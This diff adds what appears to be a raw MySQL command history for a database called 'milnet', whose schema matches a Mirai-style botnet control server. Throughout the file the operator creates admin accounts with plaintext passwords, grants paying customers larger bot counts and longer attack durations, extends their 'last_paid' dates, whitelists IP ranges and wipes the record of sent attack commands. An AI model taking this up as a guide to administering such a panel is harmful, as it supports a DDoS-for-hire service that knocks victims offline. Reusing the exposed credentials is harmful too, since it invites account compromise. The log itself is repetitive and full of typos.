@@ -1,0 +1,1579 @@
+CREATE DATABASE milnet;
+use milnet;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+CREATE TABLE `history` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `user_id` int(10) unsigned NOT NULL,   `time_sent` int(10) unsigned NOT NULL,   `duration` int(10) unsigned NOT NULL,   `command` text NOT NULL,   `max_bots` int(11) DEFAULT '-1',   PRIMARY KEY (`id`),   KEY `user_id` (`user_id`) );
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+CREATE TABLE `users` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `username` varchar(32) NOT NULL,   `password` varchar(32) NOT NULL,   `duration_limit` int(10) unsigned DEFAULT NULL,   `cooldown` int(10) unsigned NOT NULL,   `wrc` int(10) unsigned DEFAULT NULL,   `last_paid` int(10) unsigned NOT NULL,   `max_bots` int(11) DEFAULT '-1',   `admin` int(10) unsigned DEFAULT '0',   `intvl` int(10) unsigned DEFAULT '30',   `api_key` text,   PRIMARY KEY (`id`),   KEY `username` (`username`) );
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+INSERT INTO users VALUES (NULL, '0kxstroke', 'thekingofhorizon', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+show
+;
+use milnet;
+use milnet
+select * from users;
+use milnet
+select * from users;
+INSERT INTO users VALUES (NULL, 'bad', '8486rr', 500, 10, 0, 0, -1, 0, 30, '');
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history
+;
+select * from history
+;
+INSERT INTO users VALUES (NULL, 'Mamba', 'Guixxt2018@', 0, 0, 0, 0, -1, 1, 30, '');
+select * from users;
+use milnet
+select * from users.
+;
+select * from users;
+use milnet
+select * from users;
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+select * from users;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet;
+select * from history;
+select * from users;
+DELETE FROM users WHERE id=2;
+select * from users;
+use milnet.
+use milnet;
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 50 WHERE id = 4;
+select * from users;
+select * from history;
+use milnet
+select * from history;
+exit;
+use milnet;
+select * from history;
+use milnet
+select * from users;
+select * from history;
+DELETE FROM users WHERE id=4;
+select * from users;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet;
+select * from history;
+use milnet
+select * from users;
+update password="937986" where id=6;
+update users set password="937986" where id=6;
+select * from users;
+update users set cooldown=10 where id=6;
+use milnet
+select * from history;
+use milnet
+select * from history;
+update users set cooldown=20 where id=6;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+select * from users;
+use milnet
+select * from users;
+delete from users where id=6;
+use milnet
+select * from history;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+delete from users where id=8;
+select * from users;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+select * from users;
+delete from users where id=10;
+select * from users;
+select * from history;
+use milnet
+ls
+;
+select * from history;
+use milnet;
+select * from users;
+select * from history;
+exi
+t
+;
+exi t;
+use milnet
+select * from user;s
+;
+select * from users;
+select * from history;
+use milnet
+select * from users;
+delete from users where id=12;
+select * fromh hisroty;
+select * from history;
+use milnet
+select * from history;
+select * from user;s
+select * from user;
+s select * from user;
+select * from users.
+;
+select * from users;
+use milnet
+select * from users;
+delete from users where id = 15;
+use milnet
+select * from history;
+delete * from history;
+delete from history *;
+delete from history where id = *;
+use milnet;
+select * from history;
+delete * from history;
+delete from history;
+show tables;
+select milnet;
+database milnet;
+show database;
+show databases;
+use milnet;
+show tables;
+describe users;
+drop database;
+drop database milnet;
+CREATE DATABASE milnet;
+use milnet;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+CREATE TABLE `history` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `user_id` int(10) unsigned NOT NULL,   `time_sent` int(10) unsigned NOT NULL,   `duration` int(10) unsigned NOT NULL,   `command` text NOT NULL,   `max_bots` int(11) DEFAULT '-1',   PRIMARY KEY (`id`),   KEY `user_id` (`user_id`) );
+ 
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  `duration_limit` int(10) unsigned DEFAULT NULL,
+  `cooldown` int(10) unsigned NOT NULL,
+  `wrc` int(10) unsigned DEFAULT NULL,
+  `last_paid` int(10) unsigned NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  `admin` int(10) unsigned DEFAULT '0',
+  `intvl` int(10) unsigned DEFAULT '30',
+  `api_key` text,
+  PRIMARY KEY (`id`),
+  KEY `username` (`username`)
+);
+CREATE TABLE `users` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `username` varchar(32) NOT NULL,   `password` varchar(32) NOT NULL,   `duration_limit` int(10) unsigned DEFAULT NULL,   `cooldown` int(10) unsigned NOT NULL,   `wrc` int(10) unsigned DEFAULT NULL,   `last_paid` int(10) unsigned NOT NULL,   `max_bots` int(11) DEFAULT '-1',   `admin` int(10) unsigned DEFAULT '0',   `intvl` int(10) unsigned DEFAULT '30',   `api_key` text,   PRIMARY KEY (`id`),   KEY `username` (`username`) );
+ 
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+INSERT INTO users VALUES (NULL, '0kxstroke', 'thekingofhorizon', 0, 0, 0, 0, -1, 1, 30, '');
+exit;
+database milnet;
+use milnet;
+show tables;
+select into users;
+SELECT * FROM users;
+ALTER TABLE users ALTER admin = '1';
+ALTER TABLE users ALTER admin '1';
+UPDATE users SET admin = 1 WHERE id = 2;
+use milnet
+select * from users;
+select * from history;
+use milnet
+select * from history
+;
+select * from history;
+UPDATE users SET cooldown = 30 WHERE id = 4;
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history.
+;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from histor
+y;
+select * from histor y;
+select * from history;
+UPDATE users SET cooldown = 60 WHERE id = 5;
+select * from history;
+use milnet
+select * from history;
+select * from users;
+use milnet
+select * from history;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit.
+exit;
+exit. exit;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+UPDATE users SET max_bots = 1000 WHERE id = 7;
+use milnet
+select * from users;
+use milnet
+select *
+;
+show tables
+;
+select * from whitelist;
+INSET INTO whitelist VALUE 191.238.214.174;
+INSET INTO whitelist VALUE "191.238.214.174";
+INSET INTO whitelist VALUES "191.238.214.174";
+INSERT INTO whitelist VALUE "191.238.214.174";
+INSERT INTO whitelist "191.238.214.174";
+INSERT INTO whitelist(
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+INSERT INTO whitelist(   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+DROP TABLE whitelist;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+select * from whitelist;
+INSERT INTO whitelist VALUES (NULL, "191.238.214.174");
+INSERT INTO whitelist VALUES ("191.238.214.174");
+INSERT INTO whitelist VALUES (191.238.214.174);
+INSERT INTO whitelist VALUES (NULL, "191.238.214.174", "255.255.255.0");
+select * from whitelist;
+INSERT INTO whitelist VALUES (NULL, "127.0.0.1", "255");
+select * from whitelist;
+select * from history;
+select * from users;
+use milnet
+INSERT INTO whitelist VALUES (NULL, "34.95.138.205", "255.255.255.0");
+select * from whitelist
+;
+exit;
+select * from history;
+use milnet
+select * from history;
+select * from users;
+select * from whitelist;
+DROP TABLE whitelist;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET max_bots = 1200 WHERE id = 9;
+UPDATE users SET duration_limit = 500 WHERE id = 9;
+select * from users;
+UPDATE users SET cooldown = 30 WHERE id = 9;
+select * from users;
+exit;
+use milnet
+select 34.95.241.63 from history;
+select "34.95.241.63" from history;
+select * from history where ;
+select "34.95.241.63" from history where command = "34.95.241.63';
+"
+'
+;
+exot
+exit
+exit;
+use milnet
+ select "34.95.241.63" from history where command = "34.95.241.63";
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from history;
+UPDATE users SET cooldown = 50 WHERE id = 9;
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+use milnet
+select * from users;
+use milnet
+select * from users;
+DELETE FROM users WHERE id = 3;
+select * from users;
+use milnet
+SELECT * FROM users;
+DELETE FROM users WHERE id=7;
+exit;
+use milnet
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+DELETE FROM users WHERE id=5;
+exit;
+use milnet
+select * from users;
+DELETE FROM users WHERE id=9;
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from user;
+select * from users;
+DELETE FROM users WHERE id=2;
+exit;
+use milnet
+select * from users;
+DELETE FROM users WHERE id=19;
+DELETE FROM users WHERE id=20;
+DELETE FROM users WHERE id=21;
+select * from users;
+DELETE FROM users WHERE id=4;
+DELETE FROM users WHERE id=10;
+ELETE FROM users WHERE id=8;
+DELETE FROM users WHERE id=8;
+SELECT * FROM users;
+use milnet;
+select * from history;
+DELETE * FROM history;
+DROP * FROM history;
+DROP TABLE history;
+DROP * FROM history;
+select *;
+select tables;
+select * from users;
+exit;
+use milnet
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+CREATE TABLE `history` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `user_id` int(10) unsigned NOT NULL,   `time_sent` int(10) unsigned NOT NULL,   `duration` int(10) unsigned NOT NULL,   `command` text NOT NULL,   `max_bots` int(11) DEFAULT '-1',   PRIMARY KEY (`id`),   KEY `user_id` (`user_id`) );
+select * from history;
+use milnet;
+select * from users;
+DELETE FROM users WHERE id=13;
+exit;
+use milnet;
+select * from history;
+use milnet
+select * from users;
+UPDATE users SET cooldown = 10 WHERE id=26;
+UPDATE users SET cooldown = 1 WHERE id=26;
+use milnet
+UPDATE users SET cooldown = 1 WHERE id=26;
+use milnet
+select * from history;
+use milnet
+select * from users.
+;
+select * from users;
+select * from whitelist;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+DELETE FROM users WHERE id = 26;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from users;
+UPDATE TABLE users SET max_bots = 1200, duration_limit = 500 WHERE id=24;
+UPDATE TABLE users SET max_bots = 1200, duration_limit = 500 WHERE id = 24;
+UPDATE users SET max_bots = 1200 WHERE id = 24;
+UPDATE users SET max_bots = 1200, duration_limit = 500 WHERE id = 24;
+select * from users;
+UPDATE users SET last_paid = 1576075602 WHERE id = 24;
+DELETE FROM users WHERE id = 28;
+UPDATE users SET last_paid = 1576075602 WHERE id = 14;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+select * from users;
+use milnet
+select * from users;
+UPDATE users SET last_paid = 1576938937 WHERE id = 17;
+exit;
+use milnet
+select * from users;
+UPDATE users SET last_paid = 1577135546 WHERE id = 15;
+DELETE FROM users WHERE id = 32;
+DELETE FROM users WHERE id = 31;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+DELETE FROM users WHERE id=33.
+;
+select * from users;
+DELETE FROM users WHERE id=30;
+DELETE FROM users WHERE id=6;
+DELETE FROM users WHERE id=23;
+exit;
+use milnet
+select * from users;
+ALTER users SET last_paid = 1577977404 WHERE id = 25;
+UPDATE users SET last_paid = 1577977404 WHERE id = 25;
+UPDATE users SET max_bots = 2500 WHERE id = 25;
+select * from users;
+exit;
+use milnet;
+select * from users;
+UPDATE users SET password = 564564 WHERE id = 39;
+use milnet
+select * from users;
+UPDATE users SET cooldown = 80 WHERE id = 40;
+UPDATE users SET cooldown = 80 WHERE id = 39;
+UPDATE users SET cooldown = 80 WHERE id = 30;
+UPDATE users SET cooldown = 80 WHERE id = 29;
+select * from users;
+UPDATE users SET cooldown = 30 WHERE id = 38;
+UPDATE users SET cooldown = 30 WHERE id = 36;
+select * from users;
+exit;
+select * from users;
+use milnet
+select * from users;
+UPDATE users SET cooldown = 50 WHERE id = 41;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 70 WHERE id = 37;
+select * from users;
+exit;
+use milnet
+select * from users;
+DROP TABLE history;
+CREATE TABLE `history` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `user_id` int(10) unsigned NOT NULL,
+  `time_sent` int(10) unsigned NOT NULL,
+  `duration` int(10) unsigned NOT NULL,
+  `command` text NOT NULL,
+  `max_bots` int(11) DEFAULT '-1',
+  PRIMARY KEY (`id`),
+  KEY `user_id` (`user_id`)
+);
+CREATE TABLE `history` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `user_id` int(10) unsigned NOT NULL,   `time_sent` int(10) unsigned NOT NULL,   `duration` int(10) unsigned NOT NULL,   `command` text NOT NULL,   `max_bots` int(11) DEFAULT '-1',   PRIMARY KEY (`id`),   KEY `user_id` (`user_id`) );
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 100 WHERE id = 41;
+UPDATE users SET cooldown = 100 WHERE id = 40;
+UPDATE users SET cooldown = 100 WHERE id = 39;
+exit;
+use milnet
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+exit.
+;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit.
+;
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+UPDATE users SET cooldown = 100 WHERE id = 36;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+UPDATE users SET last_paid = 1578604224 WHERE id = 27;
+select * from users;
+select * from history;
+UPDATE users SET cooldown = 100 WHERE id = 37;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet;
+select * from users;
+update users set cooldown = 150 WHERE cooldown = 100;
+select * from users;
+exit;
+use milnet
+select * from users;
+DELETE from users where id = 42;
+DELETE from users where id = 35;
+select * from users;
+UPDATE users SET last_paid = 1578757757 WHERE id = 14;
+DELETE from users where id = 44;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET max_bots = 1200 WHERE id = 45;
+UPDATE users SET duration_limit = 500 WHERE id = 45;
+UPDATE users SET cooldown = 50 WHERE id = 45;
+exit;
+use milnet;
+select * from users;
+select * from history;
+select tables;
+show tables
+;
+exit;
+select * from users;
+use milnet;
+select * from users;
+UPDATE users SET last_paid = 1578921656 WHERE id = 24;
+DELETE FROM users WHERE id = 47;
+exit;
+use milnet;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 400 WHERE id = 41;
+UPDATE users SET cooldown = 400 WHERE id = 40;
+UPDATE users SET cooldown = 400 WHERE id = 39;
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 400 WHERE id = 36;
+select * from users;
+select * from history;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+UPDATE whitelist SET prefix = /24 WHERE id = 1;
+INSERT INTO whitelist(id,prefix) VALUES (1,'177.11.120.0/24');
+select * from whitelist;
+DROP table WHITELIST;
+DROP table whitelist;
+select * from users;
+select * from history/
+;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+UPDATE users SET wrc = 1 WHERE id = 1;
+UPDATE users SET wrc = 0 WHERE id = 1;
+UPDATE users SET wrc = 2 WHERE id = 1;
+UPDATE users SET wrc = 10 WHERE id = 1;
+UPDATE users SET wrc = 0 WHERE id = 1;
+select * from users;
+UPDATE users SET last_paid = UNIX_TIMESTAMP() WHERE id = 24;
+select * from users;
+UPDATE users SET last_paid = 1578921656 WHERE id = 24;
+select * from users;
+exit;
+use milnet
+show tables;
+ps -aux
+exit;
+ps -aux exit;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+UPDATE users SET password = ih321 WHERE id = 49;
+UPDATE users SET password = 'ih321' WHERE id = 49;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 800 WHERE id = 40;
+UPDATE users SET cooldown = 800 WHERE id = 39;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+DELETE FROM history WHERE id = *;
+DELETE FROM history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 1600 WHERE id = 40;
+UPDATE users SET cooldown = 1600 WHERE id = 39;
+UPDATE users SET cooldown = 1600 WHERE id = 36;
+exit;
+use milnet
+select * from history;
+select * from users;
+UPDATE users SET cooldown = 1600 WHERE id = 40;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+selet * from history;
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from users;
+DELETE from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+UPDATE users SET last_paid = TIMESTAMP() where id = 17;
+UPDATE users SET last_paid = 'TIMESTAMP()' where id = 17;
+select * from users;
+UPDATE users SET last_paid = CURRENT_TIMESTAMP where id = 17;
+select * from users;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from users;
+delete from users where id = 17;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+UPDATE users set last_paid = UNIX_TIMESTAMP() WHERE id = 15;
+select * from users;
+UPDATE users SET intvl = 60 WHERE id = 60;
+UPDATE users SET intvl = 60 WHERE id = 15;
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+exit;
+use milnet
+select * from users;
+UPDATE users SET duration_limit = 1000 WHERE id = 61;
+UPDATE users SET cooldown = 100 WHERE id = 61;
+UPDATE users SET max_bots = 2500 WHERE id = 61;
+exit;
+use milnet
+select * from users;
+UPDATE users SET max_bots = 1200 WHERE id = 55;
+UPDATE users SET duration_limit = 500 WHERE id = 55;
+UPDATE users SET last_paid = UNIX_TIMESTAMP WHERE id = 55;
+UPDATE users SET last_paid = 'UNIX_TIMESTAMP' WHERE id = 55;
+select * from users;
+UPDATE users SET last_paid = UNIX_TIMESTAMP() WHERE id = 55;
+select * from users;
+exit;
+use milnet
+select * from history;
+DELETE from history;
+drop table whitelist;
+exit;
+use milnet
+select * from users;
+UPDATE users SET intvl = 30 WHERE id = 60;
+UPDATE users SET intvl = 30 WHERE id = 15;
+select * from users;
+exit;
+use milnet
+select * from users/
+;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history.
+;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+update users set cooldown = 100 where id = 54;
+exit;
+use milnet
+select * from users;
+select * from history;
+ls
+exit;
+ls exit;
+exit;
+use milnet
+select * from users;
+update users set max_bots = 550 where id = 25;
+update users set duration_limit = 550 where id = 25;
+update users set last_paid = UNIX_TIMESTAMP() where id = 25;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+select * from history.
+;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from history;
+select * from users;
+update users set cooldown = 100 where id = 55;
+exit;
+use milnet
+select * from history;
+exit;
+use milnet
+select * from hisory;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+select * from history;
+update users set cooldown = 50 where id = 55;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+use milnet
+select * from users;
+select * from history;
+screen -r
+use milnet
+select * from users;
+select * from history
+;
+use milnet
+select * from users;
+select * from history;
+delete from history;
+select * from users;
+delete from users where id = 11;
+delete from users where id = 12;
+delete from users where id = 16;
+delete from users where id = 18;
+delete from users where id = 22;
+delete from users where id = 24;
+delete from users where id = 27;
+delete from users where id = 46;
+delete from users where id = 48;
+select * from users;
+delete from users where id = 29;
+select * from users;
+delete from history;
+select * from users;
+update users set cooldown = 800 where id= 39;
+update users set cooldown = 800 where id= 40;
+update users set cooldown = 800 where id= 36;
+select * from users;
+exit;
+use milnet
+select * from users;
+exit;
+use milnet
+select * from users;
+update users set max_bots = 1200 where id = 39
+update users set max_bots = 1200 where id = 40
+update users set max_bots = 1200 where id = 40;
+update users set max_bots = 1200 where id = 39 update users set max_bots = 1200 where id = 40 update users set max_bots = 1200 where id = 40;
+update users set max_bots = 1200 where id = 39; update users set max_bots = 1200 where id = 40;
+update users set max_bots = 1200 where id = 41;
+update users set max_bots = 1200 where id = 55;
+update users set max_bots = 1200 where id = 56;
+update users set max_bots = 1200 where id = 57;
+select * from users;
+update users set last_paid = 1581088699 where id = 57;
+update users set last_paid = 1581088699 where id = 56;
+update users set last_paid = 1581088699 where id = 41;
+update users set last_paid = 1581088699 where id = 40;
+update users set last_paid = 1581088699 where id = 39;
+update users set last_paid = 1581088699 where id = 36;
+exit;
+use milnet
+select * from users;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+exit;
+use milnet
+select * from users;
+use milnet
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+delete from history;
+select * from history;
+exit;
+use milnet
+select * from users;
+use milnet
+select * from users;
+update users set intvl = 40;
+use milnet
+select * from users;
+select * from whitelist;
+delete whitelist;
+drop whitelist;
+drop table whitelist;
+exit;
+use milnet
+select * from users;
+CREATE TABLE `whitelist` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `prefix` varchar(16) DEFAULT NULL,
+  `netmask` tinyint(3) unsigned DEFAULT NULL,
+  PRIMARY KEY (`id`),
+  KEY `prefix` (`prefix`)
+);
+CREATE TABLE `whitelist` (   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,   `prefix` varchar(16) DEFAULT NULL,   `netmask` tinyint(3) unsigned DEFAULT NULL,   PRIMARY KEY (`id`),   KEY `prefix` (`prefix`) );
+exit;
+use milnet
+select * from users;
+use milnet
+select * from users;
+update users set cooldown = UNIX_TIMESTAMP() where id = 37;
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 37;
+update users set cooldown = 30 where id = 37;
+select * from users;
+update users set max_bots = 4000 where id = 37;
+update users set max_bots = -1 where id = 37;
+exit;
+use milnet
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from users;
+use milnet
+select * from users;
+update users set password = ?1234abcd where id = 69; 
+update users set password = "?1234abcd" where id = 69; 
+update users set password = "?1234abcd" where id = 70; 
+update users set password = "?1234abcd" where id = 71; 
+select * from users;
+exti;
+exit;
+use milnet;
+select * from users;
+select * from history;
+use milnet
+select * from history;
+use milnet
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 49;
+update users set intvl = 60 where id = 49;
+select * from users;
+update users set last_paid = UNIX_TIMESTAMP() where id = 53;
+update users set max_bots = 1000 where id = 53;
+update users set duration_limit = 500 where id = 53;
+exit;
+use milnet
+select * from users;
+select * from history
+;
+select * from users;
+select * from history
+;
+select * from history
+;
+select * from users;
+update users set cooldown = 300 where id = 64;
+select * from users;
+select * from history
+;
+select * from history
+;
+select * from history
+;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+select * from users;
+exit;
+use milnet
+select * from users;
+delete from users where id = 64;
+delete from users where id = 68;
+select * from users;
+select * from history;
+select * from users;
+select * from history;
+exit;
+use milnet
+select * from history;
+select * from user;
+select * from users;
+exit;
+use milnet
